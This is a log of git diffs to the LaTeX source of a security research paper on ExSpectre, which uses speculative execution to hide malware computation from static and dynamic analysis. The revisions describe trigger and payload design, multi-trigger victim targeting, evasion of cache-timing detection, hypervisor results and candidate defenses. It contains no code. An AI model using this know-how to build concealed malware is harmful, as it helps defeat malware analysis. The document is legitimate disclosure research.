+%faithfully reproduce all hardware behaviors, or overcome a much larger burden of 
+%reverse engineering.
 

### 2018-05-08 paper/paper.tex
xspace to the rescue
siunitx
add turing implementatino
Read through - minor updates
we're living in the future
Added VM experiment to limitations and Pass on Conclusion
abtract was hardcoded in paper.tex

@@
 
+\usepackage{xspace}
 \usepackage{listings}
+\usepackage{siunitx}
+
+\newcommand{\todo}[1]{{\color{red}{\textbf{\em [TODO: #1]}}}\xspace}
+\newcommand{\TODO}[1]{\todo{#1}}
+
 \input{figures}
@@
 %\acmConference[Anonymous Submission to ACM CCS 2018]{ACM Conference on Computer and Communications Security}{Due 08 May 2018}{Toronto, Canada}
-\acmYear{2017}
+\acmYear{2018}
 
@@
 
-\newcommand{\speculake}{Exspectre }
+\newcommand{\speculake}{ExSpectre\xspace}
 
@@
 
-\begin{abstract}
-Recently, the Spectre and Meltdown attacks have revealed serious vulnerabilities in modern CPU
-designs, allowing an attacker to exfiltrate data from sensitive programs. These
-vulnerabilities take advantage of speculative execution to coerce a processor to
-perform computation that would otherwise not occur, leaking the resulting
-information via side channels to an attacker.
-
-In this paper, we extend these ideas in a different direction, and leverage speculative
-execution in order to \emph{hide malware} from both static and dynamic analysis. Using this
-technique, critical portions of a malicious program's computation can be shielded from view,
-such that even a debugger following an instruction-level trace of the
-program cannot tell how its results were computed.
-
-We introduce \emph{\speculake}, which compiles arbitrary malicious code into a
-seemingly-benign payload binary. When a separate trigger program performs a specific
-pattern of indirect jumps, it (mis)trains the CPU's branch predictor. Subsequent
-executions of the payload binary with similar jumps causes the CPU to mispredict its
-branches and speculatively execute a malicious payload, which communicates
-results back to the real world via side channels.
-
-We study the extent and types of execution that can be performed in the
-``speculative world'', and build tools that enable several computations to be
-performed covertly. In particular, within speculative execution we are able to
-decrypt memory using AES-NI instructions, and are able to interpret a custom
-virtual machine language to perform arbitrary computation.
-We also show how the trigger program
-can be a pre-existing benign application already running on the system, and
-demonstrate this concept with OpenSSL driven remotely by the attacker as our
-trigger program.
-
-Finally, we describe defenses, but in all honesty, you're probably not going to like
-them.
-
-We consider this to be a new thrust in attack vector research that harkens to work 
-done on hardware red-pills and weird machines. We demonstrate that unintended 
-functionality of architechture can be used to compose malicious programs with 
-new and different properties. This technique poses novel and unique challenges for 
-malware modeling efforts, as it forces an environment to either
-faithfully reproduce all hardware behaviors, or overcome a much larger burden of 
-reverse engineering.
-
-\end{abstract}
+\input{abstract.tex}
 
@@
 
-\section{Conclusion}
+\input{conclusion.tex}
 
@@
 
+\appendix
+\input{appendix_spasm.tex}
 \end{document}

### 2018-05-08 paper/conclusion.tex

@@
 
-In this paper we present \speculake, a model for hiding computation in speculative 
-execution that is fundamentally different than modern methods of obfuscating 
-computation. Through a series of experiments we have classified the 
+In this paper we have presented \speculake, a model for hiding computation in
+speculative execution that is fundamentally different than modern methods of
+obfuscating computation. Through a series of experiments we have classified the
 capabilities and limitations of this speculative primitive and demonstrated
-various example applications. The flexibility in these applications stemming 
-from the general computation permitted speculatively allows for emulation, 
-transparent and remote communication, and process level data encryption.  
-As a result current analysis techniques for detecting process cooperation, 
-and describing the behavior of program
-binaries are no longer definitively reliable.
+various example applications. We have demonstrated the widely varying
+capabilities of speculative execution, in particular showing that it allows for
+arbitrary computation from a Turing Machine, emulation, transparent and remote
+communication, and process level data encryption. As a result current analysis
+techniques for detecting process cooperation, and describing the behavior of
+program binaries are no longer definitively reliable.
 
-Given the parameters of the speculative primitive described in this work and
-the benefits that speculative execution provides to an attacker, the 
-feasability of an \speculake exploit is unfortunately high and is not limited 
-to data side-channels or process isolation violations. The speculative primitive 
-developed in this work not only provides a guarded form of 
-computation, but also enables cryptographic protection against current
-analysis and debugging techniques.
+Given the benefits that speculative execution provides to an attacker and the
+ease of such an attack, the feasibility of an \speculake exploit is high and is
+not limited to data side-channels or process isolation violations, as was
+originally thought in the wake of Spectre. The speculative primitive developed
+in this work not only provides a guarded form of computation, but also enables
+cryptographic protection against current analysis and debugging techniques.
 
@@
 security and performance trade-offs, though we advocate for a more robust
-solution in future processor generations. Long term
-solutions may require that we take a step backward before we can 
-securely step forward.
+solution in future processor generations. Long term solutions may require that
+we take a step backward before we can securely step forward.

### 2018-05-08 paper/discussion.tex
add discussion on approximate computing

@@
 \subsubsection{Multiple Triggers}
-To create further difficulties for an analyst, or to further target
-the execution environment it is possible
-to have the payload program test a series of separate jump patterns. The decryption
-process can then be done in stages where the result of a given stage determines 
-the initial state of the next stage that the payload program 
-performs. Only when all triggers have been completed in the correct order will
-the true plaintext be available.
+To create further difficulties for an analyst, or to further target the
+execution environment it is possible to have the payload program test a series
+of separate jump patterns. The decryption process can then be done in stages
+where the result of a given stage determines the initial state of the next stage
+that the payload program performs. Only when all triggers have been completed in
+the correct order will the true plaintext be available.
 
-While this would increase the difficulty for analyst  who has access
-to a sample in isolation, it  does not add any extra layers of complication 
-for an analyst who can observe the entire decryption process. Any state 
-encoded in the real world during the individual stages will be available to current 
-debugging tools. This allows the initial state of a sample to be modified
-to simplify subsequent runs. For example, they could patch the 
-binary to begin with the state of the final stage such that only the final 
-trigger must be run again to retreive the plaintext. While this simplifies the 
-job of acquiring the plaintext of a given \speculake sample, it does not give any 
-information about the trigger programs or the key schedules used.
+While this would increase the difficulty for analyst  who has access to a sample
+in isolation, it  does not add any extra layers of complication for an analyst
+who can observe the entire decryption process. Any state encoded in the real
+world during the individual stages will be available to current debugging tools.
+This allows the initial state of a sample to be modified to simplify subsequent
+runs. For example, they could patch the binary to begin with the state of the
+final stage such that only the final trigger must be run again to retreive the
+plaintext. While this simplifies the job of acquiring the plaintext of a given
+\speculake sample, it does not give any information about the trigger programs
+or the key schedules used.
 
@@
 section~\ref{subsec:openssl}) remote processes. For example, a payload program
-can check a series of three distinct jump patterns corresponding to three different 
-triggers. If the first trigger is detected the payload shifts in a 1 to the state; if
-the second is detected it shifts in a 0. If the third trigger is detected it 
-discontinues listening to the three triggers and proceeds with other computation. 
-This could be a direct form of \speculake using emulation and decryption 
-or more traditional malicious behavior. Using this method a payload program can
-be distributed without the encrypted data section all together, instead having 
-the data written into the process at run-time without ever connecting out to any 
-other resource.
+can check a series of three distinct jump patterns corresponding to three
+different triggers. If the first trigger is detected the payload shifts in a 1
+to the state; if the second is detected it shifts in a 0. If the third trigger
+is detected it discontinues listening to the three triggers and proceeds with
+other computation. This could be a direct form of \speculake using emulation and
+decryption or more traditional malicious behavior. Using this method a payload
+program can be distributed without the encrypted data section all together,
+instead having the data written into the process at run-time without ever
+connecting out to any other resource.
 
@@
 juicy targets for trigger design. For exmaple, if a sufficient series of jumps
-is found to exist in the TCP stack implemented in the unix kernel (i.e. in the TCP
-Checksum library) an attacker could reasonably trigger a \speculake payload remotely,
-from a spoofed IP address. This attack would rely on a payload defeating KASLR, 
-however, this has been demonstrated to be feasible~\cite{gruss2017kaslr,evtyushkin2016jump}
+is found to exist in the TCP stack implemented in the unix kernel (i.e. in the
+TCP Checksum library) an attacker could reasonably trigger a \speculake payload
+remotely, from a spoofed IP address. This attack would rely on a payload
+defeating KASLR, however, this has been demonstrated to be
+feasible~\cite{gruss2017kaslr,evtyushkin2016jump}
 
 \subsubsection{Alternative Applications}
-We have proposed the \speculake model as a new malware threat, however, this model
-of hidden computation applies more broadly. As of now there are no ways of 
-debugging speculative computation meaning that the computation done there is effectively
-isolated as with trusted execution environments. The security provided by the obfuscated 
-key schedule makes \speculake useful in the domains of Digital Rights Management (DRM)
-and whitebox cryptography, and apprimate computing fields. 
+We have proposed the \speculake model as a new malware threat, however, this
+model of hidden computation applies more broadly. As of now there are no ways of
+debugging speculative computation meaning that the computation done there is
+effectively isolated as with trusted execution environments. The security
+provided by the obfuscated key schedule makes \speculake useful in the domains
+of Digital Rights Management (DRM) and whitebox cryptography, and approximate
+computing fields. 
 %% Approximate Computing
 
+Approximate Computing prioritizes the computation of quick results that are
+potentially incorrect. This form of computation often leverages some type of
+machine learning to determine how well individual results fit with a crowd of
+approximately computed results. As mentioned in Section~\ref{subsec:impl-turing}
+occasionally values necessary for computation in the speculative world are not
+in cache and thus must be speculated themselves. In this situation error
+correcting codes are useless given that the mistake is not a mutation of the
+correct input, but rather a guess at what the input might be. The mechanisms
+used in approximate computing may be beneficial here, allowing computation to
+run speculatively and results be analyzed after the computation to determine how
+results fit, with the understanding that these results may not be accurate.
+
 %%%%%%%%%%%%%%

### 2018-05-08 paper/implementation.tex
add instructions per second

@@
 
-\TODO{Ian: how many seconds did it take to complete?}
 We implemented the 5 state Busy Beaver configuration which requires over 47
 million steps to complete. We were able to verify that the speculative world
-could correctly compute 20 thousand steps with no errors.
+could correctly compute 20 thousand steps with no errors at a rate of 324 instructions per second.
 

### 2018-05-08 paper/architecture.tex
target fn translated to speculative gadget

@@
 To verify the upper limit of speculative instructions, we instrumented our
-trigger and payload programs to test a variable-length target function before it
+trigger and payload programs to test a simple gadget of variable-length before it
 communicated a signal to the real world via a cache side channel. If the cache
@@
 
-\subsubsection{Target Function Requirements}
+\subsubsection{Gadget Location}
 The benefits of \speculake rely on the computation performed in the
 speculative function being well hidden. To this end we have verified 
-certain requirements about the locations that a target function can 
-be placed.
+certain requirements about the locations that a speculative gadget can 
+be placed within a binary.
 
-First and foremost the target function must be in the instruction cache. 
-This does not require that the function is ever run, only loaded. We have 
+First and foremost the gadget must be in the instruction cache. 
+This does not require that the actual instructions ever run,
+ only that they are in cache. We have 
 found that this is not a large barrier to overcome as Intel 
@@
 
-We have also confirmed that all speculative target code in the payload must be
+We have also confirmed that all speculative code in the payload must be
 stored in executable pages, and that it cannot be stored in non-executable data

### 2018-05-08 paper/implementation.tex
target fn translated to speculative gadget

--- 2018-05-08 paper/implementation.tex
@@
 indirect jumps, followed by a final indirect jump to a function pointer that
-pointed to target function at address 0x430000. In each of our payload programs,
+pointed to a gadget at address 0x430000. In each of our payload programs,
 we performed the same 28 indirect jumps and the final indirect jump with the
@@
 that appeared to be in the cache and then flushing all indexes).
-At address 0x430000, we placed our target
-function code for the payload program, which is never directly called
+At address 0x430000, we placed the code for our speculative gadget within the 
+payload program, which is never directly called
 (but executes speculatively). We note that this code must be loaded into the
@@
 
-We implemented a 2-symbol 5-state Busy Beaver Turing machine logic in our speculative
-target function in the payload program. Our implementation reads a global state,
+We implemented a 2-symbol 5-state Busy Beaver Turing machine logic in a  
+payload application. The gadget implementation reads a global state,
 tape, and position, and determines how the state, tape, and position should be
@@
 in cache. If one of these becomes uncached, one of two things will happen.
-First, the speculative function may simply fail to report any result back to the
+First, the speculative gadget may simply fail to report any result back to the
 real world, as the uncached read takes too long to return before the speculative
@@
 impact the correctness of our speculative code. In particular, the speculative
-target function will compute using an incorrect value of state or current
-symbol, and ultimately compute and report the wrong update.
+gadget will compute using an incorrect value of state or current
+symbol, and ultimately report the wrong update.
 
@@
 error of bit flips or noise, but rather the processor speculating what the
-speculative target function reads from memory. Thus, error correcting codes on
+speculative gadget will read from memory. Thus, error correcting codes on
 the reported result do not improve the situation.
@@
 
-In order to have confidence the speculative target function executed with the
+In order to have confidence the speculative gadget executed with the
 correct inputs and reported the computed result correctly, 
@@
 performed (and its destination is not pushed to the stack). However, we place
-our target function code at the destination address, which loads a specific value
+our gadget code at the destination address, which finishes by loading a specific value
 into the cache.

### 2018-05-08 paper/introduction.tex
target fn translated to speculative gadget

@@
 payload program will continue following the pattern of the trigger program,
-causing it to speculatively execute a \emph{target function} in the payload
+causing it to execute a \emph{speculative gadget} in the payload
 program. This execution path is shown in Figure~\ref{fig:high-level}.
 
-We emphasize that this target function is in a region that is neither
+We emphasize that this gadget is in a region that is neither
 read nor executed by the payload program, and after the CPU discovers the
 mis-speculation in the payload program, it will discard the results from the
-target function and continue executing from the correct destination. However,
+speculative gadget and continue executing from the correct destination. However,
 the payload program has a limited speculative window where it can perform
-computation in the target function, and can communicate results back to the
-``real world'' payload program via a cache side channel.
+computation, and can communicate results back to the ``real world'' payload 
+program via a cache side channel.
 
@@
 While it's possible for the trigger and payload programs to be bundled in a
-single program, an analyst aware of \speculake could easily find the target
-function in the payload program based on the jump pattern in the trigger program.
+single program, an analyst aware of \speculake could easily find the speculative
+gadget in the payload program based on the jump pattern in the trigger program.
 However, if the trigger and payload are kept separate, the analyst has a much
@@
 patterns that are effectively dead ends for the analyst, as they do not
-ultimately call the target function speculatively.
+ultimately call the hidden speculative gadget.
 

### 2018-05-09 paper/figures.tex
Expectre payload model figure updates
target fn translated to speculative gadget
add initial turing success comentary

@@
         \includegraphics[width=0.4\textwidth]{figures/general_model.pdf}
-    \caption{ General model of speculative computation within the Payload 
+    \caption{General model of speculative computation within the Payload 
         process when triggered. \textit{Speculative Computation} has read-only
@@
         \includegraphics[width=0.5\textwidth]{figures/Speculative_bandwidth}
-    \caption{Speculative Bandwidth - Using the speculative primitive 
+    \caption{Speculative Bandwidth---Using the speculative primitive 
         1KB of data can be decrypted and exfiltrated at a speed between 5 and 6 kbps
@@
     \centering
-        \includegraphics[width=0.5\textwidth]{figures/spasm_model.pdf}
-    \caption{This model describes the VM control flow. An encrypted SPASM binary 
+        \includegraphics[width=0.46\textwidth]{figures/spasm_model.pdf}
+    \caption{This diagram demonstrates the control flow of a \speculake application
+        making use of the decryption gadget and emulation. An encrypted SPASM binary 
         stored in dead code or data accessible to \textit{Speculative Computation} 
-        is decrypted  and then returned through the primitive. The SPASM 
+        is decrypted  and then returned through the primitive. The 
         \textit{Resultant Computation} performs the SPASM emulation to update the 
@@
 }
+
+\newcommand{\FigTuringSuccess}{
+\begin{figure}[t]
+    \centering
+        \includegraphics[width=0.46\textwidth]{figures/SuccessAndTime}
+
+    \caption{The number of instructions and success rate of a the 5-state Busy 
+    Beaver configuration were measured as a function of how many iterations 
+    into the speculative world were performed. We see that the amount of time 
+    to reach 20,000 instructions completed is a linear function of how many 
+    indirect calls into the speculative world we take. Additionally we see that 
+    it only requires using 4 speculative calls to achieve no errors in reaching 
+    20,000 instructions.}
+
+    \label{fig:turing_success}
+\end{figure}
+}

### 2018-05-09 paper/implementation.tex
add initial turing success comentary

@@
 \label{subsec:impl-turing}
+
+\FigTuringSuccess
 
@@
 
-%In our model the real world keeps track of the Turing state and tape. The
-%speculative world uses this information to load a specific value into cache. The
-%real world then times the loading of these values to determine which value was
-%loaded speculatively. This value is then used to update the state and tape and
-%the process is repeated until a halt state is reached.
-
 In order to have confidence the speculative gadget executed with the
@@
 
-Our Turing implementation discovered that 50 repetitions is sufficient for
-the real world to determine the correct value, as the ``hit rate'' for any one
+Our Turing implementation discovered that 4 repetitions is sufficient for the
+real world to determine the correct value, as the ``hit rate'' for any one
 iteration observing the correct value loaded in cache was over 80\%.
@@
 million steps to complete. We were able to verify that the speculative world
-could correctly compute 20 thousand steps with no errors at a rate of 324 instructions per second.
+could correctly compute 20 thousand steps with no errors at a rate of 324
+instructions per second.
 

### 2018-05-09 paper/architecture.tex
discussion pass

--- 2018-05-08 paper/architecture.tex
@@
 
-\subsubsection{Target Function Requirements}
-The benefits of \speculake rely on the computation performed in the
-speculative function being well hidden. To this end we have verified 
-certain requirements about the locations that a target function can 
-be placed.
-
-First and foremost the target function must be in the instruction cache. 
-This does not require that the function is ever run, only loaded. We have 
-found that this is not a large barrier to overcome as Intel 
-processors aggressively prefetch cache pages~\cite{measuring-cache}
-and simple access patterns could be established to ensure
-that the required block(s) are accessible.
-
-We have also confirmed that all speculative target code in the payload must be
-stored in executable pages, and that it cannot be stored in non-executable data
-sections.  We suspect that this is again due to caching. The processor has no
-reason to cache instructions stored in the data section in the instruction
-cache. If a trigger trains the branch predictor to jump to an address in the
-payload's data section, the payload will not be able to fetch the instructions
-into the execution pipeline.
-
 \subsubsection{Hyperthreading}

### 2018-05-09 paper/discussion.tex
discussion pass

@@
 \subsection{Defenses}
-We now address possible defenses to this new class of malware introduced by
-\speculake. Though we caution that these defenses often have drawbacks. The core
-component of \speculake is taking advantage of speculative execution inherent in
-CPUs today, thus these defenses focus on limiting this behavior.
-
-\subsubsection{Operating System Defenses}
-One defense to limit the capabilities of \speculake is to introduce privileged
-instructions that grant the Operating System more control.
-
-A necessary component of \speculake is the ability of a process to affect the
-Branch History Buffer (BHB), which is used by all processes, allowing programs
-to affect how separate programs choose to make indirect jumps.
-
-To address this a new set of instructions allowing the OS to set and clear the
-Branch History Buffer on context switches allows for processes to maintain a
-useful branch history while disabling other processes from affecting their jump
-decisions.
-
-By design these new instructions grant the operating system control over the
-state a program generates introducing possible attack vectors for malicious
-Operating Systems to poison the Branch History Buffer or even allow \speculake
-type attacks.
+We now address possible defenses to detecting and reverse engineering malware that uses
+\speculake.
 
@@
 \label{subsubsec:malware}
-The world of computer security is often referred to as an arms race, hackers and
-criminals racing to create and use exploits before security researchers and
-software engineers can create defenses. As such we expect to see the same type
-of race with this new class of malware.
+Like Spectre, \speculake relies on a cache side-channel to transfer
+information from the speculative world to the real world. Since the payload
+program much at least occasionally watch this side channel, it offers a
+potential method for detecting \speculake malware.
 
-A necessary portion of this class of malware is utilizing a cache side-channel,
-determining how long certain values require to load from memory or cache. Thus
-one method of defense against \speculake is to adapt malware detectors to
-examine if a program checks for the timing of loading values from memory.
+Analysts could search for telltale signs of cache inference behavior, such as
+the use of \texttt{clflush} instructions or reading cycle timings. However,
+while this would allow detection of \speculake malware, it does not directly
+help in reverse engineering the malware's behavior. We also note that our
+implementation of \speculake used the \texttt{Flush+Reload} cache side channel
+method, but other methods (such as \texttt{Prime+Probe}) could be used in its
+place.
 
-Initially this appears to be a very effective method of recognizing this attack.
-However, the notion of timing memory loads can be done in obscure ways which can
-be made to appear innocuous. As opposed to directly measuring the timing of
-memory loads, the timing can be more indirect: measuring how long a specific
-loop takes that happens to do a memory load. Or more directly, avoiding
-measuring time altogether: create a race-condition which only the
-already-in-cache value will easily win.
+In addition, the malware can also employ more subtle and less direct methods
+of measuring what is in the cache. For example, creating race conditions between
+multiple threads that results in different behaviors depending on which threads
+values are cached.
 
-While the notion of simply adapting current defenses to recognize this new
-strain of malware may be simplest, we caution that the methods introduced by
-\speculake are very general and can be accomplished in numerous ways and simply
-attempting to recognize one method will undoubtedly be circumvented by future
-generations of this malware.
+Finally, \speculake could also use another side channel method besides that
+avoids the cache
+to exfiltrate information from the speculative gadgets, such as the branch
+predictor itself~\cite{evtyushkin2018branchscope}, memory bandwidth, or power
+utilization of the system.
 
-\subsubsection{Cache Poisoning}
-As mentioned in Section~\ref{subsubsec:malware} a vital component of \speculake
-is the ability to perform cache timings. Any mechanism that modifies the cache
-can affect the success of \speculake-like attacks.
+%While the notion of simply adapting current defenses to recognize this new
+%strain of malware may be simplest, we caution that the methods introduced by
+%\speculake are very general and can be accomplished in numerous ways and simply
+%attempting to recognize one method will undoubtedly be circumvented by future
+%generations of this malware.
 
-Drastic methods such as completely poisoning the cache will hinder this attack
-while also forcing almost all loads to result in a cache miss, effectively
-nullifying the point of cache.
+\subsubsection{Hardware-level defenses}
+Ultimately, speculative execution vulnerabilities stem from problems in
+hardware, and are best fixed there. However, we note that fixing problems in
+order to prevent Spectre may not necessarily prevent \speculake malware. In Spectre, an application is
+coerced against its will to mis-speculate branches, but in \speculake, the
+application willfully encourages the mis-speculation. Thus, some solutions may
+defend against Spectre, but not \speculake.
 
-However, more conservative methods such as randomly loading values into cache
-can have a negative affect on \speculake-like attacks (causing the cache timing
-to predict incorrect values) while not having too detrimental of an affect on
-programs as a whole.
+One such solution is a new \texttt{specfence} instruction, that prohibits the
+CPU from speculating past. This instruction would require loads and stores after
+the instruction must wait (and cannot be pre-fetched) until the
+\texttt{specfence} instruction has retired. We note this is distinct from the
+\texttt{mfence} instruction that serializes memory transactions. Speculative
+reads and out-of-order execution can still occur past an \texttt{mfence}, and
+the instruction does not serialize the instruction
+stream~\cite{intel-software-guide}.
 
-In response to this method of defense \speculake-like attacks can modify the
-number of iterations and confidence thresholds necessary to determine a value.
-As mentioned in Section~\ref{subsec:impl-turing} our experiments found that it
-was only necessary to perform 50 iterations of our \texttt{target\_fn} in order
-to gain 80\% confidence in the value returned. While only 50 iterations are
-necessary, increasing this value to higher levels can lead to a significantly
-higher confidence with very little performance detriment (especially in the
-case of AES decryption).
+One way to achieve a \texttt{specfence} pseudo-instruction is to fill the ROB
+with enough instructions that the CPU cannot speculate past it. We find that the
+\texttt{rep} instruction is able to do this if it is set to repeat more than 96
+times, presumably as it issues $2*96$ $\mu$-ops, and fills the
+ROB~\cite{intel-instruction-tables}.
+
+However effective such an instruction may be against Spectre, it is not a
+defense against \speculake. A malicious \speculake malware author would simply
+not include such an instruction in either their payload or trigger programs.
+% Could add:
+%This demonstrates the versatility of speculative execution in general. While
+%defenses against Spectre are needed, a more general purpose solution to
+%speculative execution as a whole is necessary to address the wide range of its
+%capabilities.
+
+\paragraph{Operating System Defense}
+Hardware could also provide the operating system with a privileged instruction
+that gives it more control over the interaction between programs. For example,
+the OS could use a privileged instruction to copy out the Branch History Buffer
+(BHB) state when it context switches between processes, restoring it when the
+process is restored. This would prevent cross-process interactions with the
+branch predictor, and prevent multi-process \speculake malware. However, it does
+not prevent a single-process \speculake, and it does not fully address the
+Spectre vulnerability.
+
+%\subsubsection{Cache Poisoning}
+%As mentioned in Section~\ref{subsubsec:malware} a vital component of \speculake
+%is the ability to perform cache timings. Any mechanism that modifies the cache
+%can affect the success of \speculake-like attacks.
+%
+%Drastic methods such as completely poisoning the cache will hinder this attack
+%while also forcing almost all loads to result in a cache miss, effectively
+%nullifying the point of cache.
+%
+%However, more conservative methods such as randomly loading values into cache
+%can have a negative affect on \speculake-like attacks (causing the cache timing
+%to predict incorrect values) while not having too detrimental of an affect on
+%programs as a whole.
+%
+%In response to this method of defense \speculake-like attacks can modify the
+%number of iterations and confidence thresholds necessary to determine a value.
+%As mentioned in Section~\ref{subsec:impl-turing} our experiments found that it
+%was only necessary to perform 50 iterations of our \texttt{target\_fn} in order
+%to gain 80\% confidence in the value returned. While only 50 iterations are
+%necessary, increasing this value to higher levels can lead to a significantly
+%higher confidence with very little performance detriment (especially in the
+%case of AES decryption).
 
 \subsection{Resilience of \speculake}
-Spectre works to use a cache side-channel to leak information from a process. As
-such defenses to Spectre work to limit the information available to a
-speculatively executing program. One such solution may be a new instruction such
-as  \texttt{specfence}: an instruction which designates to the CPU a point that
-cannot be speculated past. This would require that loads/stores after the
-\texttt{specfence} instruction would be on hold until loads/stores from before
-the \texttt{specfence} instruction have retired. The loads/stores after a
-\texttt{specfence} do not begin to execute at all until the loads/stores before
-the \texttt{specfence} retire.
+%Spectre works to use a cache side-channel to leak information from a process. As
+%such defenses to Spectre work to limit the information available to a
+%speculatively executing program. 
+%
 
-However effective such an instruction may be against Spectre, it is not a
-defense against \speculake. Such an instruction would be useful in restricting
-the execution of a program to restrict the speculative capabilities of program,
-thereby stopping information from being leaked. However, a malicious user
-creating \speculake malware would simply choose to not use this instruction.
+\subsubsection{Gadget Location}
+The benefits of \speculake rely on the computation performed in the
+speculative function being well hidden. To this end we have verified 
+certain requirements about the locations that a speculative gadget can 
+be placed within a binary.
 
-This demonstrates the versatility of speculative execution in general. While
-defenses against Spectre are needed, a more general purpose solution to
-speculative execution as a whole is necessary to address the wide range of its
-capabilities.
+First and foremost the gadget must be in the instruction cache. 
+This does not require that the actual instructions ever run,
+ only that they are in cache. We have 
+found that this is not a large barrier to overcome as Intel 
+processors aggressively prefetch cache pages~\cite{measuring-cache}
+and simple access patterns could be established to ensure
+that the required block(s) are accessible.
 
-% We note that this instruction seems to already exist, albeit unintentionally.
-% The \texttt{rep} instruction repeats the execution of string instructions a set
-% number of times (set in a register). When set to repeat 90 or more times, these
-% instructions are not speculated past, requiring they complete and be retired
-% before looking to the next instruction. This appears to be due to the 
-% \texttt{rep} instruction adding additional $\mu$ ops per instruction, we found
-% that using the \texttt{rep} instruction caused $2n$ $\mu$ ops when the string
-% operation works on $n$ bytes~\cite{uop_article}. Thus enough repetitions would cause instructions
-% after the \texttt{rep} instruction to wait for the full repetition to be retired
-% before beginning their execution.
+We have also confirmed that all speculative code in the payload must be
+stored in executable pages, and that it cannot be stored in non-executable data
+sections. This is somewhat surprising, given the nature of the Meltdown
+vulnerability that enabled speculative execution past page faults. However, in
+the case of Meltdown, the speculative computation still occurs in pages marked
+as executable.
+
+%We suspect that this is again due to caching. The processor has no
+%reason to cache instructions stored in the data section in the instruction
+%cache. If a trigger trains the branch predictor to jump to an address in the
+%payload's data section, the payload will not be able to fetch the instructions
+%into the execution pipeline.
+
+\subsubsection{Hypervisors}
+For virtual environments that provide guests significant periods of access to 
+hardware resources, we have found that \speculake is viable in certain configurations.
+
+\texttt{Guest1 -> Guest1} - When both trigger and payload are run internal to
+a single virtual machine the branch prediction is successfully trained in the payload
+program, though at a notably reduced hit rate. This can be overcome by using an 
+increased number of iterations to establish confidence.
+
+\texttt{Guest -> Host} - In a configuration where trigger runs on the guest while the 
+payload runs on the host we have found that \speculake also successfully trains the 
+branch predictor well enough retreive a signal. Again, this signal is significantly
+reduced, implying the hypercall context swtich from guest to host requires some 
+overhead. We note that processor affinity in a guest is not mapped to processor 
+affinity in the host, as the host assigns the vm to any available CPU, though 
+eventually the hypervisor will assign the vm back to the same core as the payload 
+program allowing progress to continue.
+
+\texttt{Host -> Guest} - When trigger runs on the host attempting to train the 
+branch predictor to influence a payload process in a guest we have found that 
+the payload receives no signal. This implies that the hypercall context switch 
+from the host to the guest is heavier and has a larger impact on branch history. 
+This matches with work done by the Project Zero team at Google which found that 
+hypervisors can be fingerprinted from within a vm using the branch 
+predictor~\cite{project_zero}.
+
+\texttt{Guest1 -> Guest2} - Configurations where trigger and payload 
+run on coresident virtual machines similarly show no signal for the same 
+reasons that host to guest \speculake fails. However, this has the added difficulty
+that virtual machines must be run on the same core or on a pair of 
+hyperthreaded cores.
 
@@
 execution environment it is possible to have the payload program test a series
-of separate jump patterns. The decryption process can then be done in stages
-where the result of a given stage determines the initial state of the next stage
-that the payload program performs. Only when all triggers have been completed in
-the correct order will the true plaintext be available.
+of separate jump patterns. Instead of requiring only a single trigger program,
+the payload could require multiple trigger programs to be running
+simultaneously, or in a particular order.
 
-While this would increase the difficulty for analyst  who has access to a sample
-in isolation, it  does not add any extra layers of complication for an analyst
-who can observe the entire decryption process. Any state encoded in the real
-world during the individual stages will be available to current debugging tools.
-This allows the initial state of a sample to be modified to simplify subsequent
-runs. For example, they could patch the binary to begin with the state of the
-final stage such that only the final trigger must be run again to retreive the
-plaintext. While this simplifies the job of acquiring the plaintext of a given
-\speculake sample, it does not give any information about the trigger programs
-or the key schedules used.
+This could allow fine-grained targeting of malware. For instance, the attacker
+could distribute trigger programs to different channels to target different sets
+of victims, and have the ultimate payload only operate at the intersection of
+these groups. As an example, one trigger program could be distributed to a
+particular country (e.g. Iran), and another to a particular device globally
+(centrifuge controllers), resulting in the malicious payload (Stuxnet) only
+being revealed and executed on the intersection of these two groups.
 
@@
 to the state; if the second is detected it shifts in a 0. If the third trigger
-is detected it discontinues listening to the three triggers and proceeds with
-other computation. This could be a direct form of \speculake using emulation and
+is detected it discontinues listening to the three triggers and executes the
+data shifted into the state.
+This could be a direct form of \speculake using emulation and
 decryption or more traditional malicious behavior. Using this method a payload
@@
 requirements for identifying a benign trigger. However, we have not classified
-typical system resources that might be used a benign triggers. This is a
+typical system resources that might be used as benign triggers. This is a
 promising direction for future investigation as various system libraries present
@@
 
-\subsubsection{Alternative Applications}
-We have proposed the \speculake model as a new malware threat, however, this
-model of hidden computation applies more broadly. As of now there are no ways of
-debugging speculative computation meaning that the computation done there is
-effectively isolated as with trusted execution environments. The security
-provided by the obfuscated key schedule makes \speculake useful in the domains
-of Digital Rights Management (DRM) and whitebox cryptography, and approximate
-computing fields. 
 %% Approximate Computing 
-
+\subsubsection{Approximate Computing}
 Approximate Computing prioritizes the computation of quick results that are
@@
 used in approximate computing may be beneficial here, allowing computation to
-run speculatively and results be analyzed after the computation to determine how
-results fit, with the understanding that these results may not be accurate.
+run speculatively and have an outer process that is tolerant of errors or
+mis-steps by the speculative world.
+
+\subsubsection{Alternative Applications}
+We have proposed the \speculake model as a new malware threat, however, this
+model of hidden computation applies more broadly. As of now there are no ways of
+debugging speculative computation, meaning that the computation done there is
+effectively isolated and difficult to extract by third-parties. While not a true
+trusted execution environment, it could be used like one, offering potential
+uses in Digitial Rights Management (DRM), and whitebox cryptography.
 

### 2018-05-09 paper/discussion.tex
speed correction and quick fixes

@@
 information from the speculative world to the real world. Since the payload
-program much at least occasionally watch this side channel, it offers a
+program must at least occasionally watch this side channel, it offers a
 potential method for detecting \speculake malware.
@@
 One such solution is a new \texttt{specfence} instruction, that prohibits the
-CPU from speculating past. This instruction would require loads and stores after
+CPU from speculating past. This instruction would require that loads and stores after
 the instruction must wait (and cannot be pre-fetched) until the
@@
 with enough instructions that the CPU cannot speculate past it. We find that the
-\texttt{rep} instruction is able to do this if it is set to repeat more than 96
-times, presumably as it issues $2*96$ $\mu$-ops, and fills the
+\texttt{rep} prefix for string operations is able to do this if it is set to 
+repeat more than 96 times, presumably as it issues $2*96$ $\mu$-ops, and fills the
 ROB~\cite{intel-instruction-tables}.
@@
 This could allow fine-grained targeting of malware. For instance, the attacker
-could distribute trigger programs to different channels to target different sets
+could distribute trigger programs through different channels to target different sets
 of victims, and have the ultimate payload only operate at the intersection of

### 2018-05-09 paper/paper.tex
add paper number
minor front matter fixes

@@
 \fancyhf{} % Remove fancy page headers 
-\fancyhead[C]{Paper \#XXX} % TODO: replace 9999 with your paper number
+\fancyhead[C]{Paper \#629} % TODO: replace 9999 with your paper number
 \fancyfoot[C]{\thepage}
@@
 
-\keywords{Malware; Covert Channel; Weird Machines; TK} % TODO: replace with your keywords
